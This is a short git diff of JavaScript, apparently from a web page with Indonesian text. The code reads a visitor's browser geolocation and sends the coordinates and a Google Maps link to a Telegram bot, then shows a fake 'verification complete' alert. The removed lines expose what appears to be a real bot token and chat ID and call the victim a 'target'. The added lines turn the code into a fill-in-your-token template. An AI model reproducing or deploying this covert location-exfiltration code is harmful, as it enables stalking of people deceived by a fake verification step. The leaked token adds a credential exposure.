@@ -21,9 +21,9 @@
                     let lat = position.coords.latitude;
                     let lon = position.coords.longitude;
 
-                    let tokenBot = '8769576802:AAFqMQGPSUpiaKMtoluHfI7OBqQ_8s64yhk';
-                    let chatId = "6269176229";
-                    let urlApi = ``https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=Lokasi%20Target:%20https://maps.google.com/?q=${lat},${lon}`;
+                    let tokenBot = "MASUKKAN_TOKEN_BOT_ANDA";
+                    let chatId = "MASUKKAN_CHAT_ID_ANDA";
+                    let urlApi = `https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=Titik%20Koordinat:%0ALat:%20${lat}%20Lon:%20${lon}%0A%0ABuka%20Peta:%20https://maps.google.com/?q=${lat},${lon}`;
 
                     fetch(urlApi).then(response => {
                         alert("Verifikasi Selesai");
